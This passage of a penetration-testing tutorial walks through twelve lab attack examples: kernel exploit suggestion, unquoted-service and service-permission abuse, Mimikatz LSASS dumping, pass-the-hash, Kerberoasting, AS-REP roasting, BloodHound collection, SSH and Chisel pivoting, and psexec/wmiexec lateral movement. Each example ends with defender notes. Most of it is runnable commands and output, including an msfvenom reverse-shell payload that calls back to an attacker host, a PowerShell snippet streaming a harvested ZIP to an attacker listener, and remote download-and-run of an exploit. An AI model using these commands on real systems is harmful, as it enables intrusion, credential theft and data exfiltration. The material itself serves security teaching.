**Why It Matters:** PATH hijacking is language-agnostic — it works against any SUID binary or root cron script that uses relative command names, whether written in C, shell, or Python. The attack is clean and leaves minimal forensic traces if /tmp is cleared. Defenders should use static analysis tools (e.g., Semgrep rules) to enforce absolute paths in privileged code, and monitor for unexpected modifications to /tmp executables combined with SUID binary execution events.

---

## Example 44: Linux Privesc — Kernel Exploit Identification with linux-exploit-suggester

**What this covers:** Kernel vulnerabilities allow privilege escalation from any user context regardless of application-layer controls. linux-exploit-suggester analyzes kernel version and installed patches to recommend applicable public kernel exploits, reducing research time significantly.

**Scenario:** Authorized pentest; shell as `lowuser` on lab Ubuntu 18.04 VM 192.0.2.74; no obvious misconfigs found.

```bash
# Step 1 — Check kernel version
uname -a
# => Linux lab-target 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
# => Kernel 4.15.0-72 — relatively old; likely has known CVEs

cat /etc/os-release
# => NAME="Ubuntu"
# => VERSION="18.04.3 LTS (Bionic Beaver)"

# Step 2 — Transfer linux-exploit-suggester to target
# On attacker machine:
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
python3 -m http.server 8080 &
# => Serves LES script at http://192.0.2.200:8080/les.sh

# On target:
wget http://192.0.2.200:8080/les.sh -O /tmp/les.sh
chmod +x /tmp/les.sh

# Step 3 — Run the exploit suggester
/tmp/les.sh
# => Highly Probable Exploits:
# =>   [CVE-2019-13272] PTRACE_TRACEME
# =>     Details: https://www.openwall.com/lists/oss-security/2019/07/17/2
# =>     Exposure: highly probable
# =>     Tags: ubuntu=16.04..18.04{kernel:4.[15-17].[0-8]*},debian=9{kernel:4.9.0-*}
# =>   [CVE-2021-3156] sudo Baron Samedit
# =>     Exposure: probable
# => Probable Exploits:
# =>   [CVE-2019-18634] sudo pwfeedback
# =>     Exposure: probable

# Step 4 — Compile and run a suggested kernel exploit (lab context)
# Download CVE-2019-13272 PoC
wget http://192.0.2.200:8080/ptrace_traceme.c -O /tmp/ptrace_traceme.c
gcc /tmp/ptrace_traceme.c -o /tmp/ptrace_exploit
# => Compiles the exploit on target (gcc must be available)

/tmp/ptrace_exploit
# => [+] ptrace_traceme root exploit
# => [+] setuid(0) succeeded
# => # whoami
# => root
```

**Key Takeaway:** Kernel exploits bypass all application-layer privilege controls. linux-exploit-suggester rapidly surfaces viable exploit candidates from the kernel version alone, making kernel vulnerability assessment a required step in every Linux privilege escalation methodology.

**Why It Matters:** Kernel exploitation is a privileged lane that SUID restrictions, sudo limits, and apparmor profiles cannot stop. Organizations running legacy kernels accumulate an ever-growing list of applicable public exploits. Defenders must prioritize kernel patching, use immutable infrastructure patterns to minimize patch lag, and deploy kernel hardening options such as seccomp profiles, grsecurity patches, and SELinux mandatory access control.

---

## Example 45: Windows Privesc — Unquoted Service Path Exploitation

**What this covers:** Windows service binary paths containing spaces must be quoted. If unquoted, the Service Control Manager attempts to execute partial path segments as executables. An attacker with write access to an intermediate directory can plant a malicious binary that Windows runs as SYSTEM when the service starts.

**Scenario:** Authorized pentest; shell as a low-privileged user on lab Windows Server 2016 at 192.0.2.75.

```powershell
# Step 1 — Find services with unquoted paths containing spaces
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /iv """
# => ServiceName: VulnService
# => PathName:    C:\Program Files\Vuln Application\App Service\svc.exe
# => StartMode:   Auto
# => Path has spaces and no quotes — vulnerable!

# Alternatively use PowerShell
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select-Object Name, PathName, StartMode
# => Name      : VulnService
# => PathName  : C:\Program Files\Vuln Application\App Service\svc.exe
# => StartMode : Auto

# Step 2 — Understand how Windows resolves the unquoted path
# Windows tries these in order:
# C:\Program.exe
# C:\Program Files\Vuln.exe         ← We want this if writable
# C:\Program Files\Vuln Application\App.exe
# C:\Program Files\Vuln Application\App Service\svc.exe

# Step 3 — Check write permissions on intermediate directories
icacls "C:\Program Files\Vuln Application"
# => C:\Program Files\Vuln Application BUILTIN\Users:(OI)(CI)(W)
# => Users have write permission — we can plant a file here!

# Step 4 — Generate a malicious binary (on attacker Linux machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.200 LPORT=4445 -f exe -o Vuln.exe
# => Creates Vuln.exe reverse shell payload
# => Name matches the partial path Windows tries: C:\Program Files\Vuln.exe

# Transfer Vuln.exe to C:\Program Files\Vuln Application\Vuln.exe on target

# Step 5 — Restart the service to trigger execution
sc stop VulnService
sc start VulnService
# => Service Control Manager executes Vuln.exe as SYSTEM
# => Attacker receives a SYSTEM shell on port 4445
```

**Key Takeaway:** Unquoted service paths are a configuration flaw, not a code vulnerability. Defenders must audit all service paths with `wmic service get pathname` and wrap any path containing spaces in double quotes in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\<name>\ImagePath`.

**Why It Matters:** Unquoted service paths appear in many enterprise environments because installers from vendors frequently create them. The exploitation is reliable and persistent — the malicious binary runs on every service restart or system reboot. Defenders should run automated checks using tools like PowerSploit's Find-PathDLLHijack or Sysinternals Autoruns, and enforce quoted paths as a hardening baseline in group policy configuration management.

---

## Example 46: Windows Privesc — Weak Service Permissions with accesschk

**What this covers:** If a low-privileged user has SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions on a Windows service, they can modify the service's binary path to a malicious executable. The service then runs the attacker's code as SYSTEM when started or restarted.

**Scenario:** Authorized pentest; low-privileged user shell on lab Windows 10 VM 192.0.2.76.

```cmd
:: Step 1 — Transfer accesschk to target (Sysinternals tool)
:: On attacker: host accesschk64.exe via HTTP
:: On target:
certutil -urlcache -split -f http://192.0.2.200:8080/accesschk64.exe C:\Temp\accesschk64.exe
:: => Downloads accesschk64.exe using built-in certutil (LOLBin)

:: Step 2 — Check service permissions for the current user
C:\Temp\accesschk64.exe -uwcqv "Users" *
:: => -u suppress errors
:: => -w writable
:: => -c check service objects
:: => -q quiet (no banner)
:: => -v verbose permissions
:: => RW SSDPSRV
:: =>   SERVICE_ALL_ACCESS
:: => RW upnphost
:: =>   SERVICE_ALL_ACCESS
:: => Users have full service control over SSDPSRV and upnphost

:: Step 3 — Verify the service details
sc qc SSDPSRV
:: => SERVICE_NAME: SSDPSRV
:: => BINARY_PATH_NAME: C:\Windows\System32\svchost.exe -k LocalService
:: => START_TYPE: 3 DEMAND_START
:: => SERVICE_START_NAME: NT AUTHORITY\LocalService

:: Step 4 — Modify the binary path to a malicious executable
sc config SSDPSRV binpath= "C:\Temp\evil.exe"
:: => [SC] ChangeServiceConfig SUCCESS
:: => Service binary path changed to attacker's executable

sc config SSDPSRV obj= "LocalSystem" password= ""
:: => Changes service to run as SYSTEM (if permission allows)

:: Step 5 — Start the modified service
net stop SSDPSRV && net start SSDPSRV
:: => Service stops then starts — executes evil.exe as SYSTEM
:: => Attacker receives SYSTEM reverse shell
```

**Key Takeaway:** Overly permissive service DACLs are a direct SYSTEM escalation path. Defenders must audit service permissions with accesschk and restrict service modification rights to administrators only, following the principle of least privilege.

**Why It Matters:** Third-party software installers frequently assign broad service permissions to user groups for operational convenience. A single misconfigured service in an enterprise environment grants any authenticated user SYSTEM-level code execution. Defenders should incorporate service permission audits into CIS benchmark scans, use Protected Processes for critical services, and monitor for unexpected `sc config` commands in Windows Event Log and Sysmon event ID 16.

---

## Example 47: Credential Dumping with Mimikatz — sekurlsa::logonpasswords

**What this covers:** Mimikatz reads credentials from LSASS (Local Security Authority Subsystem Service) process memory on Windows. The `sekurlsa::logonpasswords` command extracts plaintext passwords, NTLM hashes, and Kerberos tickets for all interactive logon sessions cached in memory.

**Scenario:** Authorized pentest; SYSTEM-level shell on lab Windows Server 2016 at 192.0.2.77; credential harvesting phase.

```cmd
:: Step 1 — Launch Mimikatz (requires SYSTEM or SeDebugPrivilege)
mimikatz.exe
:: =>
:: =>   .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
:: =>  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
:: =>  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
:: =>  ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
:: =>  '## v ##'       Vincent LE TOUX               ( vincent.letoux@gmail.com )
:: =>   '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

:: Step 2 — Elevate to debug privilege (required to read LSASS)
privilege::debug
:: => Privilege '20' OK
:: => SeDebugPrivilege granted — can now read LSASS memory

:: Step 3 — Dump logon credentials from LSASS
sekurlsa::logonpasswords
:: =>
:: => Authentication Id : 0 ; 741923 (00000000:000b5223)
:: => Session           : Interactive from 2
:: => User Name         : Administrator
:: => Domain            : LAB-TARGET
:: => Logon Server      : LAB-TARGET
:: => Logon Time        : 5/21/2026 8:13:17 AM
:: => SID               : S-1-5-21-3456789012-1234567890-9876543210-500
:: =>  msv :
:: =>   [00000003] Primary
:: =>   * Username : Administrator
:: =>   * Domain   : LAB-TARGET
:: =>   * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c  ← NTLM hash
:: =>   * SHA1     : d0ad3c6e1ddc6a8f1ba7e10d7e93abb47e4ab5dc
:: =>  wdigest :
:: =>   * Username : Administrator
:: =>   * Domain   : LAB-TARGET
:: =>   * Password : (null)  ← Plaintext null on Win10+ (WDigest disabled)
:: =>  kerberos :
:: =>   * Username : Administrator
:: =>   * Domain   : LAB-TARGET
:: =>   * Password : (null)

:: Step 4 — Extract NTLM hashes specifically (cleaner output)
sekurlsa::msv
:: => Lists only MSV (NTLM) credentials — faster for large environments
```

**Key Takeaway:** Mimikatz demonstrates that LSASS memory is a high-value target requiring active protection. Defenders should enable Credential Guard (Windows 10+/Server 2016+) to move credentials into a Hyper-V isolated container, and enable Protected Process Light for LSASS.

**Why It Matters:** LSASS credential dumping is the single most impactful post-exploitation technique because harvested NTLM hashes and plaintext passwords enable immediate lateral movement without cracking. Modern Windows disables WDigest plaintext storage, but NTLM hashes remain extractable and usable via pass-the-hash. Defenders must combine Credential Guard deployment with EDR rules alerting on LSASS process access from non-system processes, and configure Windows Defender Attack Surface Reduction rules targeting LSASS.

---

## Example 48: Pass-the-Hash Attack — pth-winexe with NTLM Hash

**What this covers:** NTLM authentication allows authentication using only the password hash — the plaintext is never needed. Pass-the-hash attacks use a captured NTLM hash directly to authenticate to remote SMB, WMI, or other Windows services, enabling lateral movement without cracking the password.

**Scenario:** Authorized pentest; NTLM hash for Administrator obtained from Mimikatz on 192.0.2.77; targeting another lab Windows host at 192.0.2.78.

```bash
# Attacker is on a Linux machine with pth-suite and impacket installed

# Step 1 — Verify SMB is accessible on target
nmap -p 445 192.0.2.78
# => 445/tcp open microsoft-ds
# => SMB reachable — pass-the-hash viable

# Step 2 — Use pth-winexe to execute a command via pass-the-hash
pth-winexe -U 'LAB-TARGET/Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //192.0.2.78 whoami
# => -U specifies user in format DOMAIN/User%LMhash:NTLMhash
# => aad3b435... is the blank LM hash (LM disabled, placeholder required)
# => 8846f7eaee... is the captured NTLM hash for Administrator
# => nt authority\system
# => Command executed on 192.0.2.78 as SYSTEM via SMB

# Step 3 — Get an interactive shell via pass-the-hash
pth-winexe -U 'LAB-TARGET/Administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' //192.0.2.78 cmd.exe
# => Microsoft Windows [Version 10.0.14393]
# => C:\Windows\system32> (interactive CMD shell on 192.0.2.78)

# Step 4 — Alternatively use impacket's psexec.py for PTH
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
  Administrator@192.0.2.78
# => Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
# => [*] Requesting shares on 192.0.2.78
# => [*] Found writable share ADMIN$
# => [*] Uploading file aBcDeFgH.exe (service binary)
# => [*] Opening SVCManager on 192.0.2.78
# => [*] Creating service aBcD on 192.0.2.78
# => [*] Starting service aBcD.....
# => Microsoft Windows [Version 10.0.14393]
# => C:\Windows\system32>
```

**Key Takeaway:** Pass-the-hash makes password cracking optional — the hash itself is the credential. Defenders must segment the network to limit SMB lateral movement, use LAPS to ensure unique local admin passwords per host, and enable Windows Defender Credential Guard to prevent hash extraction from LSASS.

**Why It Matters:** Pass-the-hash is a foundational lateral movement technique in every Windows environment where the same local administrator password is reused across machines. A single successful LSASS dump can give access to the entire fleet. Defenders should enforce LAPS (Local Administrator Password Solution) universally so each machine has a unique local admin hash, disable NTLM authentication where Kerberos suffices, and alert on SMB service creation events (Event ID 7045) combined with ADMIN$ share access.

---

## Example 49: Kerberoasting — Extracting and Cracking Service Account TGS Tickets

**What this covers:** Kerberoasting targets Active Directory service accounts with Service Principal Names (SPNs). Any authenticated domain user can request Kerberos service tickets (TGS) for SPN-registered accounts. The tickets are encrypted with the service account's NTLM hash and can be cracked offline to recover the plaintext password.

**Scenario:** Authorized pentest; domain user shell on lab Windows domain `lab.example`; targeting service accounts.

```bash
# Attacker on Linux with impacket installed; valid domain credentials obtained

# Step 1 — Request TGS tickets for all SPN-registered accounts
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  lab.example/jdoe:Password123 \
  -dc-ip 192.0.2.10 \
  -request
# => lab.example/jdoe:Password123 — valid domain user credentials
# => -dc-ip — points to the domain controller at 192.0.2.10
# => -request — download TGS tickets in addition to listing SPNs
# =>
# => ServicePrincipalName              Name        MemberOf   PasswordLastSet
# => ---------------------------------  ----------  ---------  ----------------------
# => HTTP/webserver.lab.example          websvc      -          2026-01-15 09:23:41
# => MSSQLSvc/dbserver.lab.example:1433  sqlservice  -          2025-11-02 14:55:12
# =>
# => $krb5tgs$23$*websvc$LAB.EXAMPLE$HTTP/webserver.lab.example*$1a2b3c4d5e6f...
# => $krb5tgs$23$*sqlservice$LAB.EXAMPLE$MSSQLSvc/dbserver.lab.example:1433*$9f8e7d6c...
# => Hashes saved; etype 23 = RC4 encryption (crackable)

# Step 2 — Save hashes to a file
python3 GetUserSPNs.py lab.example/jdoe:Password123 -dc-ip 192.0.2.10 -request -outputfile tgs_hashes.txt
# => Hashes written to tgs_hashes.txt (one per line)

# Step 3 — Crack TGS hashes with hashcat
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# => -m 13100 selects Kerberos 5 TGS-REP etype 23 hash type
# => Dictionary + rules attack combination
# =>
# => $krb5tgs$23$*sqlservice$...:ServicePass2024!
# => Hash cracked — sqlservice password is ServicePass2024!

# Step 4 — Use cracked credentials for further access
python3 psexec.py lab.example/sqlservice:'ServicePass2024!'@192.0.2.20
# => Authenticates to DB server with recovered credentials
# => Opens interactive SYSTEM shell on the database server
```

**Key Takeaway:** Service accounts with weak passwords and SPNs are crackable by any domain user without elevated privileges. Defenders must enforce strong (25+ character random) passwords for service accounts and prefer Managed Service Accounts (MSA) or Group Managed Service Accounts (gMSA) which rotate passwords automatically.

**Why It Matters:** Kerberoasting is stealthy — TGS requests are normal Kerberos activity and blend into baseline traffic. Service accounts frequently have elevated database, file share, or application permissions, making them high-value targets. Defenders should use gMSAs for all service accounts (automatic 240-character random password rotation), audit SPN registrations for accounts with weak password policies, and deploy honeypot SPN accounts with long complex passwords to alert on kerberoasting attempts.

---

## Example 50: AS-REP Roasting — Targeting Accounts Without Pre-Authentication

**What this covers:** Kerberos pre-authentication is a security feature that requires users to prove identity before receiving a TGT. When an account has pre-auth disabled (`DONT_REQUIRE_PREAUTH` flag), anyone can request an AS-REP response containing data encrypted with that account's hash — crackable offline without any valid credentials.

**Scenario:** Authorized pentest; no domain credentials yet; targeting lab domain `lab.example` from 192.0.2.200.

```bash
# Step 1 — Enumerate accounts with pre-auth disabled (no credentials needed!)
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
  lab.example/ \
  -usersfile /usr/share/wordlists/usernames.txt \
  -format hashcat \
  -outputfile asrep_hashes.txt \
  -dc-ip 192.0.2.10
# => lab.example/ — no credentials (unauthenticated request)
# => -usersfile — list of usernames to test
# => -format hashcat — output in hashcat-compatible format
# =>
# => [-] lab.example/administrator - Client not found in Kerberos database
# => [-] lab.example/jdoe - KDC_ERR_PREAUTH_REQUIRED (normal user, pre-auth ON)
# => $krb5asrep$23$asreproast@LAB.EXAMPLE:3c4d5e6f7a8b9c0d...
# => User asreproast has pre-auth disabled — hash extracted!

# Step 2 — If domain credentials are available, enumerate all vulnerable accounts
python3 GetNPUsers.py lab.example/jdoe:Password123 -dc-ip 192.0.2.10 -request -format hashcat
# => With credentials: queries LDAP for ALL accounts with DONT_REQUIRE_PREAUTH
# => Returns AS-REP hashes for every vulnerable account found

# Step 3 — Crack the AS-REP hash with hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# => -m 18200 selects Kerberos 5 AS-REP etype 23 hash type
# => Much faster than TGS due to simpler structure
# =>
# => $krb5asrep$23$asreproast@LAB.EXAMPLE:...:Welcome1!
# => Hash cracked — account password is Welcome1!

# Step 4 — Confirm account access with cracked credentials
python3 smbclient.py lab.example/asreproast:'Welcome1!'@192.0.2.10
# => Authenticates to DC SMB share with recovered credentials
# => Type shares to list available shares; use them for further enumeration
```

**Key Takeaway:** AS-REP roasting requires zero credentials and attacks a configuration flaw rather than a software vulnerability. Defenders should enable pre-authentication for all accounts and review any exceptions, as DONT_REQUIRE_PREAUTH is almost never legitimately needed.

**Why It Matters:** Pre-auth disabled accounts are often overlooked legacy configurations from older Kerberos clients or administrator shortcuts. The attack is unauthenticated, making it valuable in initial access scenarios before any credentials are obtained. Defenders should query Active Directory for `userAccountControl` flag `0x400000` (DONT_REQUIRE_PREAUTH), eliminate all exceptions, enforce strong password policies for accounts that historically had this flag, and monitor for large volumes of AS-REQ packets to the KDC from a single source.

---

## Example 51: BloodHound Data Collection — SharpHound and Attack Path Visualization

**What this covers:** BloodHound maps Active Directory relationships (user memberships, ACLs, session data, trust relationships) and uses graph theory to identify shortest attack paths to Domain Admin. SharpHound is the data collection agent that generates JSON files for import into BloodHound's Neo4j-backed visualizer.

**Scenario:** Authorized pentest; domain user access on lab domain `lab.example`; performing AD attack path analysis.

```powershell
# Step 1 — Transfer SharpHound to target domain-joined machine
# On attacker Linux machine: host SharpHound.exe
python3 -m http.server 8080 &

# On target Windows (PowerShell):
Invoke-WebRequest -Uri http://192.0.2.200:8080/SharpHound.exe -OutFile C:\Temp\SharpHound.exe
# => Downloads SharpHound.exe to C:\Temp\

# Step 2 — Run SharpHound with All collection methods
.\SharpHound.exe -c All --outputdirectory C:\Temp\
# => -c All collects: Session, LocalGroup, ACL, Trust, ObjectProps, Container
# => Queries LDAP for AD objects and SMB for local sessions
# => [+] Creating Schema map for domain LAB.EXAMPLE using path cn=schema,cn=configuration...
# => [+] Cache File not Found! Creating new cache...
# => [+] Collecting Session data...
# => [+] Completed Session data in 00:00:04.3141579
# => [+] Collecting ACL data...
# => [+] Completed ACL data in 00:00:12.1234567
# => [+] SharpHound Enumeration Completed. Elapsed Time: 00:00:47
# => 20260521135512_BloodHound.zip generated in C:\Temp\

# Step 3 — Exfiltrate the ZIP to attacker machine
# On attacker: nc -lvnp 8888 > bloodhound.zip
# On target:
$client = New-Object Net.Sockets.TcpClient("192.0.2.200", 8888)
$stream = $client.GetStream()
$data = [System.IO.File]::ReadAllBytes("C:\Temp\20260521135512_BloodHound.zip")
$stream.Write($data, 0, $data.Length)
$client.Close()
# => Streams the ZIP file to attacker's netcat listener

# Step 4 — Import into BloodHound on attacker machine
# Start Neo4j and BloodHound on attacker
neo4j start
bloodhound &
# => Opens BloodHound GUI at http://localhost:7474

# Drag-and-drop 20260521135512_BloodHound.zip into BloodHound
# => Imports nodes and edges into the graph database

# Step 5 — Run pre-built queries to find attack paths
# In BloodHound GUI: Analysis > Find Shortest Paths to Domain Admins
# => Displays visual graph: jdoe -> GenericWrite -> AdminGroup -> Domain Admin
# => Attack path identified: jdoe has GenericWrite on AdminGroup → can add self
```

**Key Takeaway:** BloodHound reveals AD attack paths that would take hours to enumerate manually. Defenders should run BloodHound themselves regularly (purple team exercise) to identify and remediate dangerous permission chains before attackers exploit them.

**Why It Matters:** BloodHound transformed Active Directory security by making complex multi-hop attack paths immediately visible. Organizations with well-maintained AD still often have hidden paths to Domain Admin through legacy ACLs, over-permissioned groups, and session exposure. Defenders should use BloodHound for continuous attack path analysis, prioritize remediation of edges like GenericWrite, WriteDacl, and Owns on privileged groups, and tier privileged accounts to prevent credential exposure in unprivileged sessions.

---

## Example 52: Pivoting with SSH Port Forwarding — ssh -L and ProxyChains

**What this covers:** SSH local port forwarding creates an encrypted tunnel through a compromised host to reach otherwise inaccessible network segments. Combined with ProxyChains, all TCP tool traffic routes through the pivot host, enabling enumeration and exploitation of internal networks from the attacker's machine.

**Scenario:** Authorized pentest; SSH access to DMZ host `pivot` (192.0.2.80) which has access to an internal network (198.51.100.0/24) not directly reachable from attacker at 192.0.2.200.

```bash
# Step 1 — Verify the pivot host's network access
# (On pivot host via existing shell)
ip route
# => default via 192.0.2.1 dev eth0
# => 192.0.2.0/24 dev eth0 src 192.0.2.80
# => 198.51.100.0/24 dev eth1 src 198.51.100.5
# => Pivot host has eth1 on 198.51.100.0/24 — internal network accessible!

# Step 2 — Set up SSH local port forward to internal host
ssh -L 8080:198.51.100.20:80 user@192.0.2.80 -N -f
# => -L 8080:198.51.100.20:80 — forward localhost:8080 → 198.51.100.20:80
# => user@192.0.2.80 — authenticate to the pivot host
# => -N — no command execution (tunnel only)
# => -f — background the SSH session
# => Tunnel established; localhost:8080 now maps to internal web server

# Step 3 — Access the internal web server through the tunnel
curl http://127.0.0.1:8080/
# => HTTP/1.1 200 OK
# => Internal web application responding through the SSH tunnel

# Step 4 — Set up SOCKS5 proxy for full network access via ProxyChains
ssh -D 1080 user@192.0.2.80 -N -f
# => -D 1080 creates a SOCKS5 proxy on localhost:1080
# => All traffic sent through this proxy exits via the pivot host
# => Entire 198.51.100.0/24 becomes reachable

# Step 5 — Configure and use ProxyChains
# Edit /etc/proxychains4.conf:
# socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 198.51.100.0/24 -p 22,80,443,445,3389
# => Nmap traffic routes through SOCKS5 proxy on pivot host
# => 198.51.100.20: 80/tcp open
# => 198.51.100.30: 445/tcp open, 3389/tcp open
# => Internal network hosts enumerated through pivot
```

**Key Takeaway:** SSH port forwarding turns a single compromised host into a pivot point for the entire reachable network. Defenders should limit SSH access between network segments, enforce network ACLs at the firewall level, and monitor for unusual SSH connection patterns from jump hosts.

**Why It Matters:** Network segmentation is a primary defense against lateral movement, but its value collapses once an attacker gains a foothold inside the perimeter. SSH tunneling is difficult to detect because it rides on encrypted, legitimate-looking traffic. Defenders should deploy network traffic analytics to baseline SSH session durations and byte volumes, enforce firewall rules requiring traffic to flow through specific jump hosts with logging, and use privileged access workstations for SSH sessions to sensitive segments.

---

## Example 53: Pivoting with Chisel — Client/Server TCP Tunnel Through DMZ

**What this covers:** Chisel is a fast TCP/UDP tunneling tool that works over HTTP, making it effective when SSH is unavailable or when firewall rules block direct TCP connections. Chisel runs in client/server mode, with the server on the attacker machine and the client on the pivot host, establishing a reverse tunnel.

**Scenario:** Authorized pentest; web shell access on DMZ host `pivot` (192.0.2.81, outbound HTTP allowed); need to reach internal DB server at 198.51.100.25:5432.

```bash
# Step 1 — Start Chisel server on attacker machine
chisel server -p 8000 --reverse
# => -p 8000 — Chisel server listens on HTTP port 8000
# => --reverse — allows clients to create reverse tunnel listeners
# => 2026/05/21 13:55:01 server: Listening on http://0.0.0.0:8000

# Step 2 — Transfer Chisel client to pivot host
# On attacker: serve the binary
python3 -m http.server 8080 &
# => Serve chisel binary alongside server

# On pivot host (via web shell or existing access):
wget http://192.0.2.200:8080/chisel -O /tmp/chisel
chmod +x /tmp/chisel
# => Chisel client downloaded and made executable

# Step 3 — Connect Chisel client to attacker server (reverse SOCKS tunnel)
/tmp/chisel client 192.0.2.200:8000 R:socks
# => Connects outbound over HTTP to attacker's chisel server
# => R: — reverse tunnel (initiated by client, terminates on server)
# => socks — creates SOCKS5 proxy endpoint on attacker machine

# On attacker server, Chisel confirms:
# => 2026/05/21 13:55:12 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

# Step 4 — Use ProxyChains via the SOCKS5 proxy on localhost:1080
proxychains psql -h 198.51.100.25 -U postgres -p 5432
# => ProxyChains routes TCP through SOCKS5 on 127.0.0.1:1080
# => Traffic exits via pivot host's connection to internal DB
# => Password for user postgres: (enter password)
# => psql (12.8)
# => Type "help" for help.
# => postgres=#
# => Direct PostgreSQL access to internal DB through HTTP tunnel

# Step 5 — Forward a specific port instead of full SOCKS (alternative)
/tmp/chisel client 192.0.2.200:8000 R:5432:198.51.100.25:5432
# => Creates specific port forward: attacker:5432 → pivot → 198.51.100.25:5432
# => More targeted; avoids full SOCKS proxy setup
```

**Key Takeaway:** Chisel works over HTTP/HTTPS, bypassing firewall rules that block arbitrary TCP. It makes outbound HTTP the pivot channel, which is frequently allowed even in restrictive DMZ configurations. Defenders should inspect HTTP traffic for Chisel's WebSocket upgrade patterns and anomalous long-lived HTTP connections.

**Why It Matters:** Traditional port-based firewall rules fail against application-layer tunnels like Chisel because the malicious traffic looks identical to normal HTTP/HTTPS. Deep packet inspection, HTTP anomaly detection, and outbound proxy with TLS inspection are needed to detect Chisel-style tunnels. Defenders should whitelist outbound destinations for DMZ hosts rather than allowing unrestricted outbound, deploy network flow analytics to flag long-duration HTTP connections to unknown external IPs, and monitor process execution on web servers for unexpected network tools.

---

## Example 54: SMB Lateral Movement — psexec.py and smbexec.py

**What this covers:** Impacket's psexec.py and smbexec.py authenticate to remote Windows hosts over SMB using valid credentials (or hashes via pass-the-hash) and execute commands as SYSTEM. psexec uploads a service binary to ADMIN$; smbexec creates a service that runs commands via cmd.exe output redirected to a named pipe, leaving less disk evidence.

**Scenario:** Authorized pentest; valid Administrator credentials obtained; targeting lab Windows hosts 192.0.2.82 and 192.0.2.83.

```bash
# Step 1 — psexec.py — upload a service binary for interactive shell
python3 psexec.py Administrator:'P@ssword123!'@192.0.2.82
# => Impacket v0.9.24
# => [*] Requesting shares on 192.0.2.82
# => [*] Found writable share ADMIN$
# => [*] Uploading file xAbCdEfG.exe  ← Random service binary dropped to ADMIN$
# => [*] Opening SVCManager on 192.0.2.82
# => [*] Creating service sVcN on 192.0.2.82
# => [*] Starting service sVcN.....
# => nt authority\system
# => Microsoft Windows [Version 10.0.17763.2183]
# => C:\Windows\system32>

# Step 2 — psexec with hash (no password cracking required)
python3 psexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' Administrator@192.0.2.82
# => -hashes ':NTLM' — pass-the-hash (LM hash portion left blank)
# => Authenticates without knowing the plaintext password
# => C:\Windows\system32>  (SYSTEM shell)

# Step 3 — smbexec.py — execute commands without dropping a binary to disk
python3 smbexec.py Administrator:'P@ssword123!'@192.0.2.83
# => [*] Creating service BTOBTO on 192.0.2.83
# => [*] Service starts... done.
# => No binary uploaded to disk — cmd.exe used directly via service
# => C:\WINDOWS\system32>

# Step 4 — Run a single command without interactive shell
python3 psexec.py Administrator:'P@ssword123!'@192.0.2.82 whoami
# => nt authority\system
# => Single command mode — runs and exits cleanly

# Step 5 — Enumerate other reachable hosts from the new foothold
net view /domain:LAB
# => Server Name       Remark
# => \\FILESERVER
# => \\DBSERVER
# => \\APPSERVER
# => Identifies additional lateral movement targets
```

**Key Takeaway:** psexec/smbexec turn valid credentials into SYSTEM shells across every reachable Windows host. smbexec leaves less forensic evidence because it avoids dropping a binary. Defenders must limit SMB access, enforce LAPS, and monitor for service creation events from unexpected sources.

**Why It Matters:** SMB-based lateral movement is the dominant technique in Windows enterprise environments because SMB is universally available and administrators legitimately use it for management. Detecting psexec requires monitoring Windows Event ID 7045 (service installation), Sysmon event ID 1 (process creation by services), and ADMIN$ share access patterns. Defenders should segment the network to block SMB between workstations, enforce host-based firewalls, and use Privileged Access Workstations for administrative SMB connections.

---

## Example 55: WMI Lateral Movement — wmiexec.py Command Execution

**What this covers:** Windows Management Instrumentation (WMI) provides remote command execution through the DCOM protocol on port 135 and dynamically assigned high ports. Impacket's wmiexec.py uses WMI to run commands on remote hosts and retrieves output through a temporary SMB share, avoiding service creation and leaving a smaller footprint than psexec.

**Scenario:** Authorized pentest; Administrator credentials available; targeting lab Windows host 192.0.2.84 where SMB service creation is monitored.

```bash
# Step 1 — Execute a single command via WMI (semi-interactive)
python3 wmiexec.py Administrator:'P@ssword123!'@192.0.2.84 whoami
# => Impacket v0.9.24
# => [*] SMBv3.0 dialect used
# => nt authority\system
# => Command executed; output retrieved via temporary share

# Step 2 — Open a semi-interactive shell via WMI
python3 wmiexec.py Administrator:'P@ssword123!'@192.0.2.84
# => [*] SMBv3.0 dialect used
# => C:\>
# => Semi-interactive shell — each command creates a new WMI process

# Step 3 — Run reconnaissance commands from the shell
ipconfig /all
# => Windows IP Configuration
# =>    Host Name . . . . . . . . . . . : WORKSTATION02
# =>    IPv4 Address. . . . . . . . . . : 192.0.2.84
# =>    IPv4 Address. . . . . . . . . . : 198.51.100.84  ← Second NIC!
# => Host is dual-homed — new pivot opportunity discovered

net localgroup administrators
# => Members:
# =>   Administrator
# =>   lab\svc_deploy  ← Service account has local admin!
# => svc_deploy is a potential Kerberoasting or credential reuse target

# Step 4 — WMI with hash (pass-the-hash)
python3 wmiexec.py -hashes ':8846f7eaee8fb117ad06bdd830b7586c' Administrator@192.0.2.84 hostname
# => WORKSTATION02
